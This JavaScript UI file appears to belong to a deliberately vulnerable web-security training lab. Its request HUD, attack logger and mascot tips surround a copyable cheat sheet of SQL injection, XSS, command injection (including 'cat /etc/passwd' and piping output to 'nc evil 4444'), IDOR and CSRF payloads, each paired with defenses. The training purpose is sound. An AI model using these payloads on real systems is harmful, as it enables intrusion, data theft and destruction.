/**
 * BAI Lab UI extras from design handoff: sakura, HUD + HTMX logging,
 * payload cheat-sheet, mascot speech bubbles, refresh skeleton.
 */
(function () {
  'use strict';

  const REQ_LOG = [];
  const ATK_LOG = [];

  function escapeHtml(s) {
    return String(s ?? '').replace(/[&<>"']/g, (m) =>
      ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m])
    );
  }

  function isSecureMode() {
    return document.body.classList.contains('sec-secure');
  }

  function fmtTime(d) {
    return d.toTimeString().slice(0, 8) + '.' + String(d.getMilliseconds()).padStart(3, '0');
  }

  function logRequest(entry) {
    const t = new Date();
    const elapsed = (12 + Math.random() * 180) | 0;
    const row = {
      id: Date.now() + Math.random(),
      t,
      method: entry.method || 'GET',
      path: entry.path || '/',
      headers: entry.headers || {},
      body: entry.body || null,
      status: entry.status ?? 200,
      blocked: !!entry.blocked,
      note: entry.note || '',
      elapsed,
    };
    REQ_LOG.unshift(row);
    if (REQ_LOG.length > 60) REQ_LOG.pop();
    renderReqs();
    return row;
  }

  function logAttack(a) {
    const t = new Date();
    ATK_LOG.unshift({
      id: Date.now() + Math.random(),
      t,
      vuln: a.vuln,
      payload: a.payload,
      success: a.success,
      note: a.note || '',
      mode: isSecureMode() ? 'secure' : 'vulnerable',
      who: document.body.dataset.baiUser || 'anon',
    });
    if (ATK_LOG.length > 50) ATK_LOG.pop();
    renderAtks();
    if (a.success) achievement('💥 ' + a.vuln + ' pwned!');
    else if (isSecureMode()) achievement('🛡️ ' + a.vuln + ' blocked');
  }

  function achievement(text) {
    const el = document.createElement('div');
    el.className = 'bai-achievement-toast';
    el.textContent = text;
    document.body.appendChild(el);
    requestAnimationFrame(() => el.classList.add('bai-achievement-toast--show'));
    setTimeout(() => {
      el.classList.remove('bai-achievement-toast--show');
      setTimeout(() => el.remove(), 320);
    }, 2400);
  }

  function renderReqs() {
    const count = document.getElementById('reqs-count');
    const list = document.getElementById('reqs-list');
    if (!count || !list) return;
    count.textContent = String(REQ_LOG.length);
    list.innerHTML =
      REQ_LOG.slice(0, 15)
        .map((r) => {
          const pillClass = r.blocked
            ? 'pill-403'
            : r.note === 'pwn'
              ? 'pill-pwn'
              : r.status >= 400
                ? 'pill-403'
                : 'pill-200';
          return (
            '<div class="hud-row method-' +
            escapeHtml(r.method) +
            '" data-req-id="' +
            r.id +
            '">' +
            '<div style="display:flex;align-items:center;gap:8px">' +
            '<span class="pill" style="background:#f3f4f6;color:#111">' +
            escapeHtml(r.method) +
            '</span>' +
            '<span style="flex:1;color:#374151;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' +
            escapeHtml(r.path) +
            '</span>' +
            '<span class="pill ' +
            pillClass +
            '">' +
            (r.blocked ? 'BLOCK' : escapeHtml(String(r.status))) +
            '</span>' +
            '</div>' +
            '<div style="color:#9ca3af;font-size:10px;margin-top:2px">' +
            fmtTime(r.t) +
            ' • ' +
            r.elapsed +
            'ms</div>' +
            '</div>'
          );
        })
        .join('') ||
      '<div style="color:#9ca3af;text-align:center;padding:18px;font-size:11px">No requests yet — interact with the app.</div>';

    list.querySelectorAll('.hud-row[data-req-id]').forEach((row) => {
      row.addEventListener('click', function () {
        const id = parseFloat(this.getAttribute('data-req-id'));
        showReq(id);
      });
    });
  }

  function showReq(id) {
    const r = REQ_LOG.find((x) => x.id === id);
    if (!r) return;
    const detail = document.getElementById('reqs-detail');
    if (!detail) return;
    const headerLines = Object.entries(r.headers)
      .map(([k, v]) => k + ': ' + v)
      .join('\n');
    detail.style.display = 'block';
    detail.innerHTML =
      '<span class="info">' +
      escapeHtml(r.method) +
      ' ' +
      escapeHtml(r.path) +
      ' HTTP/1.1</span>\n' +
      '<span class="dim">' +
      escapeHtml(headerLines) +
      '</span>' +
      (r.body
        ? '\n' + escapeHtml(typeof r.body === 'string' ? r.body : JSON.stringify(r.body, null, 2))
        : '') +
      '\n\n<span class="' +
      (r.blocked ? 'err' : 'ok') +
      '">← HTTP/1.1 ' +
      (r.blocked ? '403 Forbidden' : r.status + ' OK') +
      '</span>\n' +
      '<span class="dim">x-elapsed: ' +
      r.elapsed +
      'ms' +
      (r.note ? '\nx-bai-note: ' + escapeHtml(r.note) : '') +
      '</span>';
  }

  function renderAtks() {
    const count = document.getElementById('atk-count');
    const list = document.getElementById('atk-list');
    if (!count || !list) return;
    count.textContent = String(ATK_LOG.length);
    list.innerHTML =
      ATK_LOG.slice(0, 20)
        .map((a) => {
          const cls = a.success ? 'pill-pwn' : 'pill-blocked';
          const lbl = a.success ? 'PWND' : 'BLOCKED';
          return (
            '<div class="hud-row" style="border-left:3px solid ' +
            (a.success ? '#f59e0b' : '#3b82f6') +
            '">' +
            '<div style="display:flex;gap:6px;align-items:center;margin-bottom:3px">' +
            '<span class="pill" style="background:#fce7f3;color:#831843">' +
            escapeHtml(a.vuln) +
            '</span>' +
            '<span class="pill ' +
            cls +
            '">' +
            lbl +
            '</span>' +
            '<span style="margin-left:auto;color:#9ca3af;font-size:10px">' +
            fmtTime(a.t) +
            '</span>' +
            '</div>' +
            '<div style="color:#374151;word-break:break-all">' +
            escapeHtml(a.payload).slice(0, 160) +
            '</div>' +
            '<div style="color:#9ca3af;font-size:10px;margin-top:2px">@' +
            escapeHtml(a.who) +
            ' • ' +
            escapeHtml(a.mode) +
            (a.note ? ' • ' + escapeHtml(a.note) : '') +
            '</div>' +
            '</div>'
          );
        })
        .join('') ||
      '<div style="color:#9ca3af;text-align:center;padding:18px;font-size:11px">No attacks attempted yet.</div>';
  }

  window.toggleHud = function (id) {
    const body = document.getElementById(id === 'hud-requests' ? 'reqs-body' : 'atk-body');
    if (!body) return;
    body.style.display = body.style.display === 'none' ? 'block' : 'none';
  };

  window.exportPoC = function () {
    const lines = ['# BAI Lab — PoC report', '', 'Generated: ' + new Date().toISOString(), '', '## Attacks (' + ATK_LOG.length + ')', ''];
    ATK_LOG.slice()
      .reverse()
      .forEach((a, i) => {
        lines.push('### ' + (i + 1) + '. ' + a.vuln + ' — ' + (a.success ? '✅ succeeded' : '🛡 blocked'));
        lines.push('- mode: `' + a.mode + '`  user: `' + a.who + '`  time: ' + a.t.toISOString());
        lines.push('- payload:');
        lines.push('```');
        lines.push(a.payload);
        lines.push('```');
        if (a.note) lines.push('- note: ' + a.note);
        lines.push('');
      });
    const blob = new Blob([lines.join('\n')], { type: 'text/markdown' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'bai-lab-poc.md';
    a.click();
  };

  window.toggleCheat = function () {
    const d = document.getElementById('cheat-drawer');
    if (d) d.classList.toggle('open');
  };

  /* ----- Sakura ----- */
  function spawnSakura() {
    const layer = document.getElementById('sakura-canvas');
    if (!layer || window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
    function petal() {
      const p = document.createElement('div');
      p.className = 'petal';
      const size = 8 + Math.random() * 14;
      p.style.width = size + 'px';
      p.style.height = size + 'px';
      p.style.left = Math.random() * 100 + 'vw';
      p.style.opacity = (0.45 + Math.random() * 0.5).toFixed(2);
      p.style.setProperty('--drift', ((Math.random() * 220 - 110) | 0) + 'px');
      const dur = 9 + Math.random() * 9;
      p.style.animation = 'petalFall ' + dur + 's linear forwards';
      layer.appendChild(p);
      setTimeout(() => p.remove(), dur * 1000 + 200);
    }
    setInterval(petal, 700);
    for (let i = 0; i < 6; i++) setTimeout(petal, i * 120);
  }

  /* ----- Mascot speech ----- */
  const VULN_TIPS = [
    'Watch those apostrophes! 🍡',
    "Try ' OR 1=1 -- 💉",
    '<script> in a comment — classic 🪤',
    'IDs in URLs are tempting… 🔓',
    'Shell metacharacters: ; cat /etc/passwd 💻',
    'GET /api/users — data leaks 🗝️',
  ];
  const SECURE_TIPS = [
    'Parameterized queries ✓',
    'Templates escape XSS 🛡️',
    'CSRF tokens matter 🔐',
    'bcrypt > plaintext 🌸',
    'SameSite cookies help',
  ];

  function speakMascot() {
    const el = document.getElementById('anime-mascot');
    if (!el || el.classList.contains('hidden') || window.getComputedStyle(el).display === 'none') return;
    const tips = isSecureMode() ? SECURE_TIPS : VULN_TIPS;
    const text = tips[(Math.random() * tips.length) | 0];
    const r = el.getBoundingClientRect();
    const b = document.createElement('div');
    b.className = 'speech-bubble';
    b.textContent = text;
    b.style.left = Math.max(8, r.left - 180) + 'px';
    b.style.top = Math.max(8, r.top - 14) + 'px';
    document.body.appendChild(b);
    setTimeout(() => b.remove(), 5000);
  }

  /* ----- Posts skeleton (HTMX refresh) ----- */
  function postsSkeleton(n) {
    n = n || 3;
    let h = '<div id="posts-container" class="grid gap-4 sm:gap-6">';
    for (let i = 0; i < n; i++) {
      h +=
        '<article class="rounded-2xl border border-fuchsia-100 bg-white/90 p-6">' +
        '<div class="flex items-start justify-between gap-4 mb-3">' +
        '<div class="flex-1 space-y-2">' +
        '<div class="skeleton" style="height:1.25rem;width:66%"></div>' +
        '<div class="skeleton" style="height:0.75rem;width:33%"></div>' +
        '</div>' +
        '<div class="skeleton rounded-full" style="height:1.5rem;width:5rem"></div>' +
        '</div>' +
        '<div class="space-y-2 mb-4">' +
        '<div class="skeleton" style="height:0.75rem;width:100%"></div>' +
        '<div class="skeleton" style="height:0.75rem;width:92%"></div>' +
        '<div class="skeleton" style="height:0.75rem;width:75%"></div>' +
        '</div>' +
        '<div class="pt-4 border-t border-fuchsia-100">' +
        '<div class="skeleton" style="height:1rem;width:6rem"></div>' +
        '</div>' +
        '</article>';
    }
    return h + '</div>';
  }

  function heuristicsAfterRequest(detail) {
    const cfg = detail.requestConfig;
    if (!cfg) return;
    const path = cfg.path || '';
    const verb = (cfg.verb || 'GET').toUpperCase();
    const xhr = detail.xhr;
    const status = xhr ? xhr.status : 0;
    const vuln = !isSecureMode();

    if (path.indexOf('/api/search-vulnerable') !== -1 && vuln) {
      try {
        const u = new URL(path, window.location.origin);
        const q = u.searchParams.get('q') || '';
        if (/'?\s*OR\s*1\s*=\s*1|UNION\s+SELECT|--/i.test(q)) {
          logAttack({ vuln: 'SQLi', payload: q, success: true, note: 'concat' });
        }
      } catch (_) {}
    }

    if (verb === 'POST' && path.indexOf('/ui/partials/login') !== -1 && vuln) {
      try {
        const raw = cfg.parameters || {};
        const u = (raw.username || '').toString();
        const p = (raw.password || '').toString();
        if (/'?\s*OR\s*'1'\s*=\s*'1|'?\s*OR\s*1\s*=\s*1|--/i.test(u + p)) {
          logAttack({ vuln: 'SQLi (login)', payload: 'u=' + u, success: true, note: 'auth bypass' });
        }
      } catch (_) {}
    }

    if (verb === 'POST' && /comments-vulnerable|\/posts\/.+\/comments/i.test(path) && vuln && status < 400) {
      const body = cfg.parameters && cfg.parameters.body ? String(cfg.parameters.body) : '';
      if (/<scr|onerror|onload|<svg|<img\s|javascript:/i.test(body)) {
        logAttack({ vuln: 'XSS (stored)', payload: body.slice(0, 120), success: true, note: 'raw render' });
      }
    }
  }

  document.body.addEventListener('htmx:beforeRequest', function (evt) {
    const elt = evt.detail.elt;
    if (!elt) return;
    const hxGet = elt.getAttribute && elt.getAttribute('hx-get');
    const targetSel = elt.getAttribute && elt.getAttribute('hx-target');
    if (hxGet === '/ui/partials/posts' && targetSel === '#posts-container') {
      const target = document.querySelector('#posts-container');
      if (target) target.outerHTML = postsSkeleton(3);
    }
  });

  document.body.addEventListener('htmx:afterRequest', function (evt) {
    const detail = evt.detail;
    const cfg = detail.requestConfig;
    if (!cfg) return;
    let path = cfg.path || '/';
    const elt = detail.elt;
    if ((!path || path === '/') && elt && elt.getAttribute) {
      path = elt.getAttribute('hx-post') || elt.getAttribute('hx-get') || path;
    }
    const verb = (cfg.verb || 'GET').toUpperCase();
    const xhr = detail.xhr;
    const status = xhr ? xhr.status : 0;
    let body = null;
    try {
      if (cfg.parameters && Object.keys(cfg.parameters).length)
        body =
          verb === 'GET'
            ? null
            : new URLSearchParams(cfg.parameters).toString().slice(0, 500);
    } catch (_) {}
    let note = '';
    if (path.indexOf('search-vulnerable') !== -1 && !isSecureMode()) {
      try {
        const u = new URL(path, window.location.origin);
        if (/'?\s*OR|UNION|--/i.test(u.searchParams.get('q') || '')) note = 'pwn';
      } catch (_) {}
    }
    logRequest({
      method: verb,
      path: path,
      headers: { Accept: (xhr && xhr.getResponseHeader('Content-Type')) || 'text/html' },
      body: body,
      status: status,
      blocked: status === 403,
      note: note,
    });
    heuristicsAfterRequest(detail);
  });

  /* ----- Cheat sheet data (from design) ----- */
  const CHEATS = [
    {
      title: '💉 SQL Injection',
      cwe: 'CWE-89 / OWASP A03',
      what: 'SQL injection via unsanitized input concatenated into queries.',
      detect: "Apostrophe causes errors. '-- changes behavior. sleep() delays response.",
      defense: ['Prepared statements (? placeholders)', 'ORM (sqlx, gorm)', 'Whitelist sort columns', 'Least-privilege DB user', 'WAF as defense-in-depth'],
      payloads: [
        ['Auth bypass', "' OR 1=1 --"],
        ['Auth bypass v2', "admin' --"],
        ['Tautology', "' OR '1'='1"],
        ["UNION dump", "' UNION SELECT 1,username,password,1,1 FROM users --"],
        ['Column count', "' ORDER BY 6 --"],
        ['Stacked', '1; DROP TABLE posts --'],
        ["Time-based blind", "' OR sleep(5) --"],
        ['Boolean blind', "' AND substr(password,1,1)='a' --"],
        ['Enum (SQLite)', "' UNION SELECT name,sql,1,1,1 FROM sqlite_master --"],
      ],
    },
    {
      title: '🪤 Cross-Site Scripting (XSS)',
      cwe: 'CWE-79 / OWASP A03',
      what: 'Injecting JS into a page rendered to another user (Stored / Reflected / DOM).',
      detect: 'Comments rendered as raw HTML. Missing Content-Security-Policy.',
      defense: ['Auto-escape in templates (Templ)', "CSP: script-src 'self'", 'HttpOnly+Secure cookies', 'X-Content-Type-Options: nosniff', 'Sanitizer (bluemonday)'],
      payloads: [
        ['Classic', "<script>alert('XSS')</script>"],
        ['Without script', '<img src=x onerror=alert(1)>'],
        ['SVG', '<svg onload=alert(document.cookie)>'],
        ['Case bypass', '<ScRiPt>alert(1)</ScRiPt>'],
      ],
    },
    {
      title: '🔓 Broken Access Control / IDOR',
      cwe: 'CWE-639 / OWASP A01',
      what: 'Missing ownership checks — ID manipulation exposes or edits others data.',
      detect: 'Numeric IDs in URLs. No 403 after substitution.',
      defense: ['ownerId == session.userId on server', 'UUIDs instead of int IDs', 'RBAC middleware', 'Deny by default'],
      payloads: [['Sequential ID', '/ui/posts/edit/2'], ['Force browse', '/admin (as user)']],
    },
    {
      title: '💻 Command Injection',
      cwe: 'CWE-78 / OWASP A03',
      what: 'User input passed to sh -c — metacharacters split commands.',
      detect: '; && | $() \` in host/IP fields adds extra output.',
      defense: ['exec.Command("ping","-c1",host) — no shell', 'Regex ^[a-zA-Z0-9.-]+$', 'Whitelist arguments'],
      payloads: [['Semicolon', '8.8.8.8 ; cat /etc/passwd'], ['AND', '127.0.0.1 && whoami'], ['Pipe', '8.8.8.8 | nc evil 4444']],
    },
    {
      title: '🛂 CSRF',
      cwe: 'CWE-352 / OWASP A01',
      what: 'A third-party site tricks a logged-in victim into a state-changing request.',
      detect: 'POST without CSRF token; cookies without SameSite.',
      defense: ['CSRF token on POST/PUT/DELETE', 'SameSite=Lax/Strict', 'Origin/Referer checks'],
      payloads: [['Auto-submit form', '<form id=f action=https://victim/change method=POST>…</form>']],
    },
    {
      title: '🗝️ Sensitive Data Exposure',
      cwe: 'CWE-200 / OWASP A02',
      what: 'Plaintext passwords, API keys in repo, verbose errors in production.',
      detect: "GET /api/users returns 'password'; .env in git.",
      defense: ['bcrypt in DB', 'Secrets in env/Vault', 'HSTS + TLS', 'Release mode without stack traces'],
      payloads: [['Endpoint dump', 'GET /api/users'], ['Backup', '/.git/config, /backup.sql']],
    },
    {
      title: '📋 Burp quick start',
      cwe: null,
      what: 'HTTP proxy for intercepting and modifying requests.',
      detect: null,
      defense: null,
      payloads: [
        ['Proxy', '127.0.0.1:8080 + CA cert'],
        ['Repeater', 'Ctrl+R — resend with edits'],
        ['Intruder', 'Sniper / Cluster bomb'],
      ],
    },
    {
      title: '📚 Mini glossary',
      cwe: null,
      what: 'Terms useful during the lab defense.',
      detect: null,
      defense: null,
      payloads: [
        ['CSP', 'Content-Security-Policy — script/style allowlists.'],
        ['CORS', 'Who may read cross-origin responses.'],
        ['SOP', 'Same-Origin Policy — default isolation.'],
        ['CWE', 'Weakness taxonomy (e.g. CWE-89 = SQLi).'],
      ],
    },
  ];

  let cheatFilter = '';

  window.copyPayload = function (btn, text) {
    navigator.clipboard.writeText(text).then(function () {
      btn.classList.add('copied');
      setTimeout(function () {
        btn.classList.remove('copied');
      }, 1400);
    });
  };

  function buildCheatSheet() {
    const body = document.getElementById('cheat-body');
    if (!body) return;
    const f = cheatFilter.toLowerCase();
    const matches = CHEATS.filter(function (c) {
      if (!f) return true;
      const blob =
        c.title +
        (c.what || '') +
        (c.detect || '') +
        (c.defense || []).join(' ') +
        JSON.stringify(c.payloads);
      return blob.toLowerCase().includes(f);
    });
    let html =
      '<div class="sticky top-0 z-10 bg-white/95 backdrop-blur pb-3 mb-2 -mx-1 px-1 border-b border-fuchsia-100">' +
      '<input id="cheat-search" type="search" placeholder="🔎 Filter (sql, xss, csrf...)" class="w-full rounded-xl border border-fuchsia-200 bg-white px-3 py-2 text-sm outline-none focus:border-pink-400 focus:ring-2 focus:ring-pink-100" value="' +
      escapeHtml(cheatFilter) +
      '"/>' +
      '<p class="text-[10px] text-slate-500 mt-1.5 leading-tight">Click a payload to copy. ' +
      matches.length +
      '/' +
      CHEATS.length +
      ' sections.</p></div>';

    html += matches
      .map(function (c) {
        const payloadsHtml = c.payloads
          .map(function (pair) {
            const label = pair[0];
            const p = pair[1];
            const safeP = JSON.stringify(p).replace(/"/g, '&quot;');
            return (
              '<div class="mb-2">' +
              '<div class="text-[10px] font-bold uppercase tracking-wider text-fuchsia-700 mb-1">' +
              escapeHtml(label) +
              '</div>' +
              '<button type="button" class="copy-btn" data-payload="' +
              escapeHtml(p).replace(/"/g, '&quot;') +
              '">' +
              escapeHtml(p) +
              '</button></div>'
            );
          })
          .join('');
        return (
          '<details class="rounded-xl border border-fuchsia-100 bg-fuchsia-50/40 overflow-hidden mb-2"' +
          (f ? ' open' : '') +
          '>' +
          '<summary class="px-3 py-2.5 font-extrabold text-sm text-slate-800 hover:bg-fuchsia-50 flex items-center justify-between gap-2">' +
          '<span>' +
          c.title +
          '</span>' +
          (c.cwe ? '<span class="text-[9px] font-mono font-normal text-fuchsia-500 whitespace-nowrap">' + escapeHtml(c.cwe) + '</span>' : '') +
          '</summary>' +
          '<div class="px-3 pb-3 pt-1 space-y-3">' +
          (c.what
            ? '<div class="text-xs text-slate-700 leading-relaxed"><strong class="text-fuchsia-700">What:</strong> ' +
              escapeHtml(c.what) +
              '</div>'
            : '') +
          (c.detect
            ? '<div class="text-xs text-slate-700 leading-relaxed"><strong class="text-amber-700">Detect:</strong> ' +
              escapeHtml(c.detect) +
              '</div>'
            : '') +
          (c.defense
            ? '<div class="text-xs text-slate-700 leading-relaxed"><strong class="text-emerald-700">Defense:</strong><ul class="list-disc list-inside mt-1 space-y-0.5 marker:text-emerald-400">' +
              c.defense.map((d) => '<li>' + escapeHtml(d) + '</li>').join('') +
              '</ul></div>'
            : '') +
          '<div class="pt-2 border-t border-fuchsia-100">' +
          payloadsHtml +
          '</div></div></details>'
        );
      })
      .join('');

    if (matches.length === 0) html += '<p class="text-sm text-slate-500 text-center py-8">No results.</p>';
    body.innerHTML = html;

    const search = document.getElementById('cheat-search');
    if (search) {
      search.addEventListener('input', function () {
        cheatFilter = this.value;
        buildCheatSheet();
        const again = document.getElementById('cheat-search');
        if (again) {
          again.focus();
          again.setSelectionRange(again.value.length, again.value.length);
        }
      });
    }
    body.querySelectorAll('.copy-btn[data-payload]').forEach(function (btn) {
      btn.addEventListener('click', function () {
        window.copyPayload(this, this.getAttribute('data-payload'));
      });
    });
  }

  function init() {
    spawnSakura();
    renderReqs();
    renderAtks();
    buildCheatSheet();
    logRequest({
      method: 'GET',
      path: window.location.pathname + window.location.search,
      headers: { Accept: 'text/html' },
      status: 200,
      note: 'page load',
    });
    setInterval(speakMascot, 9000);
    setTimeout(speakMascot, 1800);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
